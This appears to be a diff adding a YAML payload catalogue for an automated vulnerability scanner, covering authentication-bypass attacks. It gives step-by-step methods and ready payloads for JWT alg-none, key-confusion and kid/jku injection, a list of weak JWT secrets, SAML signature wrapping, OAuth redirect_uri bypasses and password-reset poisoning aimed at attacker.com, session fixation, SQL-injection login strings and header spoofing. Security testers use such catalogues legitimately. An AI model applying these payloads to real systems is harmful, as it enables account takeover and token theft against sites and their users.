@@ -1,0 +1,188 @@
+# knowledge/rules/auth_bypass_rules.yaml
+# SAM-∞ v28-Ω  Authentication Bypass Detection Rules
+# ──────────────────────────────────────────────────────────────────────────────
+
+meta:
+  vuln_type: auth_bypass
+  version: "1.0.0"
+  last_updated: "2026-10-27"
+  description: "认证绕过规则：JWT 攻击、SAML 注入、OAuth 误配置、session fixation、password reset poisoning"
+
+default_oracle_pattern: ""
+oracle_type: "differential_access"
+note: "认证绕过验证：能够以无效凭据或他人身份访问受保护资源"
+
+# ── JWT（JSON Web Token）攻击 ────────────────────────────────────────────────
+jwt_attacks:
+  alg_none:
+    description: "将 alg 字段改为 none，服务端接受无签名 token"
+    method: |
+      1. 解码 JWT header（base64）
+      2. 将 alg 字段改为 "none"（大小写变体均测试）
+      3. 将 payload 中的用户 ID 改为目标用户 ID 或 admin
+      4. 签名部分改为空字符串
+      5. 重新 base64 编码（注意：不加 padding "="）
+    payload_variants:
+      - '{"alg":"none","typ":"JWT"}'
+      - '{"alg":"None","typ":"JWT"}'
+      - '{"alg":"NONE","typ":"JWT"}'
+      - '{"alg":"nOnE","typ":"JWT"}'
+    oracle: "成功访问受保护资源（响应包含目标用户数据）"
+    confidence: 0.85
+
+  rs256_to_hs256:
+    description: "将 RS256 改为 HS256，用服务端公钥作为 HMAC 密钥"
+    method: |
+      1. 获取服务端 RSA 公钥（/api/auth/public-key 或 /.well-known/jwks.json）
+      2. 将 JWT header 的 alg 改为 HS256
+      3. 用 RSA 公钥作为 HMAC-SHA256 的密钥重新签名
+    oracle: "成功访问受保护资源"
+    confidence: 0.82
+
+  kid_injection:
+    description: "在 kid 字段注入 SQLi 或路径遍历"
+    payload_variants:
+      - '{"kid":"../../dev/null","alg":"HS256"}'  # /dev/null 作为密钥（空密钥）
+      - '{"kid":"key'' UNION SELECT NULL-- -","alg":"HS256"}'
+      - '{"kid":"../../../etc/passwd","alg":"HS256"}'
+    oracle: "服务端使用攻击者控制的密钥验证签名"
+    confidence: 0.78
+
+  weak_secret_bruteforce:
+    description: "弱密钥爆破（secret/password/admin 等常见密钥）"
+    common_secrets:
+      - "secret"
+      - "password"
+      - "admin"
+      - "key"
+      - "jwt_secret"
+      - "your-256-bit-secret"
+      - "changeme"
+      - ""  # 空密钥
+    tool: "jwt_tool（--crack 模式）"
+    confidence: 0.75
+
+  jku_injection:
+    description: "在 jku/x5u 字段注入攻击者控制的 JWKS URL"
+    method: |
+      1. 生成 RSA 密钥对
+      2. 将公钥发布到攻击者控制的 URL
+      3. 修改 JWT header 的 jku 字段指向该 URL
+      4. 用对应私钥重新签名 JWT
+    oracle: "服务端从攻击者 URL 获取 JWK 并验证通过"
+    confidence: 0.80
+
+# ── SAML 注入 ────────────────────────────────────────────────────────────────
+saml_attacks:
+  xml_signature_wrapping:
+    description: "将合法的 SAML 响应包裹在攻击者控制的 XML 中"
+    method: |
+      1. 捕获合法 SAML 响应
+      2. 在 XML 中插入新的 Assertion 元素（修改用户名为 admin）
+      3. 将原合法签名保留在 XML 中（签名仍然有效，但指向的是旧 Assertion）
+    oracle: "以 admin 或目标用户身份登录成功"
+    confidence: 0.80
+
+  comment_injection:
+    description: "在用户名中注入 XML 注释，截断原有验证"
+    payload: "admin<!->@evil.com"
+    oracle: "以 admin@domain.com 身份认证通过"
+    confidence: 0.75
+
+# ── OAuth 误配置 ─────────────────────────────────────────────────────────────
+oauth_attacks:
+  redirect_uri_bypass:
+    description: "redirect_uri 验证不严格，允许开放重定向"
+    payload_variants:
+      - "{redirect_uri}/../attacker.com"
+      - "{redirect_uri}@attacker.com"
+      - "https://attacker.com"
+      - "{redirect_uri}%0d%0ahttps://attacker.com"
+    oracle: "code 参数被重定向到攻击者域名"
+    confidence: 0.82
+
+  state_csrf:
+    description: "state 参数未验证或可预测，CSRF 攻击"
+    method: "构造固定 state 值的 OAuth 链接，诱导受害者点击"
+    confidence: 0.75
+
+  implicit_token_leak:
+    description: "Implicit Flow 中 access_token 通过 Referer 头泄露"
+    oracle: "Referer 头中包含 access_token"
+    confidence: 0.78
+
+# ── Session Fixation ─────────────────────────────────────────────────────────
+session_fixation:
+  description: "攻击者预设 session ID，受害者登录后使用该 ID"
+  method: |
+    1. 获取一个未认证的 session ID
+    2. 将该 session ID 注入受害者浏览器（XSS 或 URL 参数）
+    3. 受害者使用该 session ID 登录
+    4. 攻击者用同一 session ID 访问受保护资源
+  oracle: "能以受害者身份访问资源"
+  confidence: 0.78
+
+# ── Password Reset Poisoning ────────────────────────────────────────────────
+password_reset_poisoning:
+  description: "修改 Host 头，使密码重置链接指向攻击者域名"
+  payload_headers:
+    - "Host: attacker.com"
+    - "X-Forwarded-Host: attacker.com"
+    - "X-Host: attacker.com"
+    - "X-Forwarded-Server: attacker.com"
+  method: |
+    1. 发起密码重置请求，同时修改 Host 头为攻击者域名
+    2. 受害者收到密码重置邮件，链接指向 attacker.com
+    3. 攻击者在 attacker.com 服务器上捕获带 token 的请求
+    4. 使用捕获的 token 重置受害者密码
+  oracle: "OAST HTTP 回调接收到包含 token 的密码重置请求"
+  oracle_type: oast_http
+  confidence: 0.85
+
+# ── 万能密码（SQL 注入绕过认证）─────────────────────────────────────────────────
+payloads:
+  - payload: "' OR '1'='1'-- -"
+    oracle_pattern: ""
+    category: sql_auth_bypass
+    confidence: 0.80
+    note: "用户名字段 SQLi 绕过认证"
+
+  - payload: "admin'-- -"
+    oracle_pattern: ""
+    category: sql_auth_bypass
+    confidence: 0.78
+
+  - payload: "' OR 1=1-- -"
+    oracle_pattern: ""
+    category: sql_auth_bypass
+    confidence: 0.78
+
+  - payload: "' OR 'x'='x"
+    oracle_pattern: ""
+    category: sql_auth_bypass
+    confidence: 0.75
+
+  # HTTP 头部伪造
+  - payload: "X-Original-URL: /admin"
+    oracle_pattern: ""
+    category: header_bypass
+    confidence: 0.72
+
+  - payload: "X-Rewrite-URL: /admin"
+    oracle_pattern: ""
+    category: header_bypass
+    confidence: 0.70
+
+  - payload: "X-Custom-IP-Authorization: 127.0.0.1"
+    oracle_pattern: ""
+    category: ip_spoofing
+    confidence: 0.70
+
+  - payload: "X-Forwarded-For: 127.0.0.1"
+    oracle_pattern: ""
+    category: ip_spoofing
+    confidence: 0.72
+
+distilled_rules: []
+total_distilled_rules: 0
+last_updated: "2026-10-27"
